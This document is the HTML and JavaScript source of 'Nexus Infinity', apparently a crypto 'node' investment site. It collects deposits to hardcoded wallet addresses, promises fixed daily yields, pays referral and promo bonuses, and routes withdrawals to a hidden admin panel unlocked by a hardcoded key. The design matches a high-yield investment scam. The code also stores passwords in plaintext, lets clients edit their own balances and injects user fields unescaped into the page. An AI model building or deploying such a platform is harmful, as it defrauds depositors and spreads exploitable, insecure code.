<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        
        :root { 
            --neon-pink: #ff00ff; 
            --neon-blue: #00d4ff;
            --glass-light: rgba(255, 255, 255, 0.08);
            --bg-color: #0a0c10;
        }

        body { 
            background: var(--bg-color); 
            color: #e2e8f0; 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            margin: 0; 
            overflow-x: hidden; 
        }

        /* Lightened Background with Gradient Overlays */
        .premium-bg {
            background: radial-gradient(circle at top right, rgba(255, 0, 255, 0.05), transparent),
                        radial-gradient(circle at bottom left, rgba(0, 212, 255, 0.05), transparent),
                        var(--bg-color);
        }

        .glass-panel { 
            background: var(--glass-light); 
            backdrop-filter: blur(40px); 
            border: 1px solid rgba(255, 255, 255, 0.12); 
            border-radius: 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }

        .btn-platinum { 
            background: linear-gradient(135deg, #ff00ff, #7000ff); 
            color: white; 
            font-weight: 800; 
            padding: 18px; 
            border-radius: 22px; 
            width: 100%; 
            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 8px 25px rgba(255, 0, 255, 0.2);
        }

        .btn-platinum:active { transform: scale(0.95); }

        .input-hub { 
            background: rgba(255, 255, 255, 0.05); 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            border-radius: 20px; 
            padding: 18px; 
            color: white; 
            width: 100%; 
            outline: none;
            transition: 0.3s;
        }

        .input-hub:focus { border-color: var(--neon-blue); background: rgba(255, 255, 255, 0.08); }

        .nav-item { color: #64748b; text-align: center; cursor: pointer; transition: 0.3s; flex: 1; }
        .nav-active { color: #fff; transform: translateY(-5px); }
        .nav-active i { color: var(--neon-pink); filter: drop-shadow(0 0 8px var(--neon-pink)); }

        .hidden { display: none !important; }

        /* Animation for Nodes */
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .animate-node { animation: slideUp 0.4s ease forwards; }
    </style>
</head>
<body class="premium-bg">

    <div id="splash" class="fixed inset-0 bg-[#0a0c10] z-[9999] flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-gradient-to-tr from-pink-500 to-blue-500 rounded-[2.5rem] flex items-center justify-center text-5xl font-black text-white shadow-2xl animate-bounce italic">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-8 text-xs tracking-[0.6em] text-white">NEXUS INFINITY</h1>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden">
        <div class="max-w-md w-full glass-panel p-10 space-y-8">
            <div class="text-center">
                <h2 class="text-2xl font-black italic tracking-widest uppercase">Master <span class="text-pink-500">Node</span></h2>
                <p class="text-[9px] text-zinc-500 font-bold uppercase mt-2 tracking-widest">Global Asset Distribution Hub</p>
            </div>
            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Account Identifier" class="input-hub">
                <input type="password" id="l-pass" placeholder="Security Access Key" class="input-hub">
                <button onclick="handleLogin()" class="btn-platinum">Authorize Access</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] text-zinc-400 font-black uppercase cursor-pointer hover:text-white">Initialize New Protocol</p>
            </div>
            <div id="signup-ui" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="Establish User ID" class="input-hub">
                <input type="password" id="s-pass" placeholder="Secure Access Key" class="input-hub">
                <input type="text" id="s-ref" placeholder="Affiliate Code (Optional)" class="input-hub">
                <button onclick="handleSignup()" class="btn-platinum">Activate Identity</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-400 font-black uppercase cursor-pointer">Back to Security Hub</p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-32">
        <header class="p-6 sticky top-0 bg-[#0a0c10]/70 backdrop-blur-3xl z-50 border-b border-white/5 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="admin-trigger" class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center font-black border border-white/10 italic text-xl">N</div>
                <div>
                    <span id="nav-user" class="text-sm font-black italic text-pink-500 uppercase">...</span>
                    <span class="block text-[8px] text-blue-400 font-bold uppercase tracking-tighter">Status: Institutional Admin</span>
                </div>
            </div>
            <button onclick="logout()" class="text-zinc-500 hover:text-red-500 transition"><i class="fa-solid fa-power-off text-xl"></i></button>
        </header>

        <main id="page-home" class="p-6 space-y-6">
            <div class="glass-panel p-10 relative overflow-hidden bg-gradient-to-br from-white/10 to-transparent">
                <p class="text-[9px] font-black text-zinc-400 uppercase tracking-widest mb-1">Vault Portfolio</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-8 flex justify-between border-t border-white/10 pt-6">
                    <div><p class="text-[7px] text-zinc-500 uppercase font-black">Daily Yield</p><p id="profit-txt" class="text-xl font-black text-pink-500">+$0.00</p></div>
                    <div class="text-right"><p class="text-[7px] text-zinc-500 uppercase font-black">Ref Code</p><p id="my-ref" class="text-[11px] font-black text-blue-400 uppercase tracking-wider">...</p></div>
                </div>
            </div>

            <div class="glass-panel p-5 flex gap-3">
                <input type="text" id="promo-input" placeholder="Promo / Bonus Code" class="input-hub !py-3 !text-[11px]">
                <button onclick="applyPromo()" class="btn-platinum !w-auto !px-8 !py-3 !text-[10px]">Claim</button>
            </div>

            <h3 class="text-xs font-black uppercase text-zinc-500 tracking-widest ml-2">Active Infrastructure</h3>
            <div id="active-nodes-list" class="grid gap-4"></div>
        </main>

        <main id="page-market" class="p-6 space-y-6 hidden">
            <h3 class="text-xl font-black italic text-pink-500 uppercase tracking-tighter">Node Distribution Market</h3>
            <div id="market-list" class="grid gap-4"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-8 hidden">
            <div class="glass-panel p-8 space-y-8">
                <h3 class="text-lg font-black italic text-pink-500 uppercase">Capital Injection</h3>
                <div class="grid gap-3">
                    <div class="bg-white/5 p-4 rounded-2xl border border-white/10">
                        <p class="text-[8px] font-black text-zinc-500 uppercase mb-1">Binance USDT (TRC20)</p>
                        <p class="text-[10px] font-bold text-white select-all break-all">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</p>
                    </div>
                    <div class="bg-white/5 p-4 rounded-2xl border border-white/10">
                        <p class="text-[8px] font-black text-zinc-500 uppercase mb-1">Trust Wallet (BEP20)</p>
                        <p class="text-[10px] font-bold text-white select-all break-all">0xD9359EADE5F5bACA51fb7da043767Bc0685bC355</p>
                    </div>
                </div>
                <div class="space-y-4 pt-4 border-t border-white/5">
                    <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-hub">
                    <input type="text" id="dep-tid" placeholder="Transaction TID / Hash" class="input-hub">
                    <input type="file" id="dep-proof" accept="image/*" class="text-[10px] block w-full file:bg-pink-500/20 file:text-pink-400 file:border-0 file:rounded-full file:px-4 file:py-2">
                    <img id="preview-img" class="mt-4 w-full h-40 rounded-3xl object-cover hidden border-2 border-white/10">
                    <button onclick="submitDep()" class="btn-platinum">Authorize Injection</button>
                </div>
            </div>

            <div class="glass-panel p-8 space-y-6">
                <h3 class="text-lg font-black italic uppercase">Request Distribution</h3>
                <div class="space-y-4">
                    <select id="w-method" class="input-hub bg-zinc-950">
                        <option>Binance Pay</option>
                        <option>Trust Wallet</option>
                        <option>MetaMask</option>
                        <option>OKX Exchange</option>
                        <option>Coinbase</option>
                        <option>Bybit</option>
                    </select>
                    <input type="text" id="w-addr" placeholder="Wallet Address / ID" class="input-hub">
                    <input type="number" id="w-amt" placeholder="Payout Amount ($)" class="input-hub">
                    <button onclick="submitWith()" class="btn-platinum !bg-zinc-800">Queue Payout</button>
                </div>
            </div>
        </main>

        <main id="page-info" class="p-6 space-y-6 hidden pb-20">
            <div class="glass-panel p-8 space-y-4">
                <h3 class="text-lg font-black italic text-pink-500 uppercase">Institutional Overview</h3>
                <p class="text-[11px] text-zinc-400 leading-relaxed">Nexus Infinity is a leading digital infrastructure firm providing decentralized node computing and automated yield management. Our platform operates on high-security 256-bit encryption protocols.</p>
            </div>
            <div class="glass-panel p-8 space-y-4">
                <h3 class="text-sm font-black uppercase tracking-widest">Support & FAQ</h3>
                <div class="space-y-4">
                    <details class="text-[10px] text-zinc-400 border-b border-white/5 pb-3"><summary class="font-bold text-white cursor-pointer">What is the minimum deposit?</summary><p class="mt-2 ml-2">Institutional entry starts at $10.00 USD.</p></details>
                    <details class="text-[10px] text-zinc-400 border-b border-white/5 pb-3"><summary class="font-bold text-white cursor-pointer">How are profits calculated?</summary><p class="mt-2 ml-2">Yield is generated every 24 hours based on active node capacity.</p></details>
                </div>
            </div>
            <div class="glass-panel p-8">
                <h3 class="text-[9px] font-black uppercase text-zinc-500 mb-2">Legal Clearance</h3>
                <p class="text-[8px] text-zinc-600 uppercase font-bold italic">© 2026 NEXUS INFINITY GLOBAL. ALL PROTOCOLS RESERVED. PRIVACY SECURED.</p>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-6 bg-[#0a0c10]/90 backdrop-blur-3xl border-t border-white/5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-bolt-lightning text-xl mb-1"></i><p class="font-black text-[7px] uppercase">Core</p></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-microchip text-xl mb-1"></i><p class="font-black text-[7px] uppercase">Nodes</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-vault text-xl mb-1"></i><p class="font-black text-[7px] uppercase">Vault</p></div>
            <div onclick="switchPage('info')" class="nav-item"><i class="fa-solid fa-circle-info text-xl mb-1"></i><p class="font-black text-[7px] uppercase">Info</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#0a0c10] z-[10000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 border-b border-white/10 pb-6">
            <h2 class="text-2xl font-black italic text-pink-500 uppercase tracking-tighter">Master Override</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button>
        </div>
        <div id="admin-requests" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // 15+ Advanced Node Infrastructure
        const marketNodes = Array.from({length: 16}, (_, i) => ({
            id: i+1,
            title: i < 8 ? `Standard S-${i+1}` : `Enterprise X-${i-7}`,
            price: i < 8 ? (i+1)*25 : (i-7)*500,
            daily: i < 8 ? (i+1)*3.2 : (i-7)*75,
            days: i < 8 ? 30 : 60,
            tier: i < 8 ? 'Basic' : 'Elite'
        }));

        const PROMOS = { "SWEETIE": 500, "NEXUS10": 10, "WELCOME": 50 };

        window.onload = () => {
            renderMarket();
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const user = localStorage.getItem('nexus_user');
                if(user) showDashboard(user);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        function renderMarket() {
            document.getElementById('market-list').innerHTML = marketNodes.map(n => `
                <div class="glass-panel p-6 flex justify-between items-center border-l-4 ${n.tier === 'Elite' ? 'border-pink-500' : 'border-blue-500'} animate-node">
                    <div>
                        <span class="text-[7px] font-black uppercase text-zinc-500 tracking-widest">${n.tier} Tier</span>
                        <h4 class="text-lg font-black italic mt-1 uppercase">${n.title}</h4>
                        <p class="text-[10px] font-bold text-green-400">$${n.daily.toFixed(2)} / 24H</p>
                    </div>
                    <div class="text-right">
                        <p class="text-xl font-black text-white">$${n.price}</p>
                        <button onclick="buyNode(${n.id})" class="mt-2 bg-white text-black px-6 py-1.5 rounded-xl text-[9px] font-black uppercase">Buy</button>
                    </div>
                </div>`).join('');
        }

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user'), node = marketNodes.find(x => x.id === id), snap = await get(ref(db, `users/${user}`));
            if((snap.val().balance || 0) < node.price) return alert("Insufficient Vault Funds!");
            const start = Date.now();
            await update(ref(db, `users/${user}`), { balance: snap.val().balance - node.price });
            await set(push(ref(db, `users/${user}/nodes`)), { ...node, startTime: start, expires: start + (node.days * 86400000), lastClaim: start });
            alert("Infrastructure Successfully Deployed!"); switchPage('home');
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            document.getElementById('my-ref').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                
                const nodes = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = nodes.map(([k, n]) => {
                    const rem = Math.max(0, n.expires - Date.now()), hours = Math.floor(rem / 3600000);
                    if(Date.now() - n.lastClaim >= 86400000) {
                        update(ref(db, `users/${uid}`), { profit: (d.profit || 0) + n.daily });
                        update(ref(db, `users/${uid}/nodes/${k}`), { lastClaim: Date.now() });
                    }
                    return `<div class="glass-panel p-6 border-l-2 border-pink-500 flex justify-between items-center"><div class="space-y-1"><p class="text-[10px] font-black uppercase">${n.title}</p><p class="text-[9px] text-zinc-500 font-bold">Yield: $${n.daily.toFixed(2)}/Day</p></div><div class="text-right"><p class="text-[8px] font-black text-pink-500 animate-pulse italic">SYNCING</p><p class="text-[7px] text-zinc-500 mt-1">${hours}H Left</p></div></div>`;
                }).join('') || '<p class="text-center opacity-20 py-20 uppercase font-black text-[10px] tracking-widest">No Active Nodes</p>';
            });
        }

        window.applyPromo = async () => {
            const code = document.getElementById('promo-input').value.trim().toUpperCase(), user = localStorage.getItem('nexus_user');
            if(PROMOS[code]) {
                const s = await get(ref(db, `users/${user}`));
                if(s.val().promoUsed) return alert("Security: Promo already activated!");
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + PROMOS[code], promoUsed: true });
                alert(`Authorization Complete: $${PROMOS[code]} Added.`);
            } else alert("Invalid Authorization Code.");
        };

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user'), amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value, proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("Missing Protocol Data!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, proof, status: 'Pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry); await set(ref(db, 'admin/requests/' + hRef.key), entry);
            alert("Deposit Protocol Initiated.");
        };

        window.submitWith = async () => {
            const u = localStorage.getItem('nexus_user'), amt = document.getElementById('w-amt').value, addr = document.getElementById('w-addr').value;
            if(!amt || !addr) return alert("Protocol Denial: Data Required!");
            const hRef = push(ref(db, `users/${u}/history`));
            const entry = { user: u, amount: amt, address: addr, status: 'Pending', date: new Date().toLocaleString(), type: 'Withdrawal', hKey: hRef.key };
            await set(hRef, entry); await set(ref(db, 'admin/requests/' + hRef.key), entry);
            alert("Withdrawal Queued for Audit.");
        };

        window.manage = async (id, user, amt, hKey, action) => {
            if(action === 'approve') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Approved' });
            } else { await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Rejected' }); }
            await remove(ref(db, 'admin/requests/' + id));
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass-panel p-6 space-y-4 border border-pink-500/20">
                        <div class="flex justify-between items-center text-[9px] font-black uppercase"><span class="text-pink-500">${l.type}</span><span class="text-zinc-600">${l.date}</span></div>
                        <p class="text-xs">User: <span class="font-black italic text-blue-400">${l.user}</span> | Amt: <span class="text-green-500 font-black">$${l.amount}</span></p>
                        ${l.proof ? `<img src="${l.proof}" class="w-full h-40 object-cover rounded-3xl border border-white/5" onclick="window.open(this.src)">` : `<p class="text-[9px] text-zinc-500 break-all">ADDR: ${l.address}</p>`}
                        <div class="grid grid-cols-2 gap-4"><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','approve')" class="bg-green-600/20 text-green-500 py-4 rounded-2xl text-[10px] font-black uppercase">Approve</button><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','reject')" class="bg-red-600/20 text-red-500 py-4 rounded-2xl text-[10px] font-black uppercase">Reject</button></div>
                    </div>`).join('') : '<p class="text-center opacity-30 py-20 font-black text-[10px] tracking-widest uppercase">Grid Operational</p>';
            });
        }

        document.getElementById('dep-proof').onchange = (e) => { const r = new FileReader(); r.readAsDataURL(e.target.files[0]); r.onload = () => { document.getElementById('preview-img').src = r.result; document.getElementById('preview-img').classList.remove('hidden'); }; };
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Security Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        window.switchPage = (p) => { ['home','market','vault','info'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim(), snap = await get(ref(db, `users/${u}`)); if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Protocol Denial: Invalid Credentials."); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(), refId = document.getElementById('s-ref').value.trim(); if(!u || !p) return alert("Fields Mandatory!"); await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, referredBy: refId }); if(refId) { const rSnap = await get(ref(db, `users/${refId}`)); if(rSnap.exists()) { await update(ref(db, `users/${refId}`), { balance: (rSnap.val().balance || 0) + 5 }); } } alert("Protocol Initialized!"); toggleAuth(false); };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
